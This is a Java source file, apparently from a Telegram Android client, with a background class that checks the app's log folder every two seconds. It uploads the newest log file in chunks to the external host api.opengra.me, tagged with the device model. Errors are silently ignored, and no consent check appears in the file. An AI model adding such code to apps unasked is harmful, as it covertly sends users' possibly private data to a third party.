package org.telegram.messenger;

import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;

import java.io.File;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.Comparator;
import java.util.UUID;

public final class RemoteLogUploader {

    private static final String URL_STRING = "https://api.opengra.me/debug-log";
    private static final long POLL_INTERVAL_MS = 2000L;
    private static final int MAX_CHUNK = 256 * 1024;

    private static HandlerThread thread;
    private static Handler handler;
    private static File dir;
    private static File file;
    private static long offset;
    private static String deviceTag;

    public static synchronized void start(File logFile) {
        if (thread != null || logFile == null) return;
        file = logFile;
        dir = logFile.getParentFile();
        offset = 0;
        deviceTag = (Build.MANUFACTURER + "-" + Build.MODEL + "-" + UUID.randomUUID().toString().substring(0, 8))
                .replace(' ', '_').replaceAll("[^A-Za-z0-9_.\\-]", "");
        thread = new HandlerThread("RemoteLogUploader");
        thread.start();
        handler = new Handler(thread.getLooper());
        handler.post(runnable);
    }

    private static final Runnable runnable = new Runnable() {
        @Override
        public void run() {
            try {
                pickLatestFile();
                uploadChunk();
            } catch (Throwable ignored) {
            }
            if (handler != null) handler.postDelayed(this, POLL_INTERVAL_MS);
        }
    };

    private static void pickLatestFile() {
        if (dir == null || !dir.isDirectory()) return;
        File[] files = dir.listFiles(f -> f.isFile() && f.getName().endsWith(".txt") && !f.getName().contains("_mtproto") && !f.getName().contains("_tonlib"));
        if (files == null || files.length == 0) return;
        Arrays.sort(files, Comparator.comparingLong(File::lastModified).reversed());
        File latest = files[0];
        if (file == null || !latest.getAbsolutePath().equals(file.getAbsolutePath())) {
            file = latest;
            offset = 0;
        }
    }

    private static void uploadChunk() throws Exception {
        if (file == null || !file.exists()) return;
        long size = file.length();
        if (size <= offset) return;
        long readUpto = Math.min(size, offset + MAX_CHUNK);
        int len = (int) (readUpto - offset);
        byte[] data = new byte[len];
        try (RandomAccessFile raf = new RandomAccessFile(file, "r")) {
            raf.seek(offset);
            raf.readFully(data);
        }

        HttpURLConnection c = (HttpURLConnection) new URL(URL_STRING).openConnection();
        try {
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
            c.setRequestProperty("X-Tag", deviceTag);
            c.setRequestProperty("X-Offset", String.valueOf(offset));
            try (OutputStream os = c.getOutputStream()) {
                os.write(data);
            }
            int code = c.getResponseCode();
            if (code >= 200 && code < 300) {
                offset = readUpto;
            }
        } finally {
            c.disconnect();
        }
    }
}
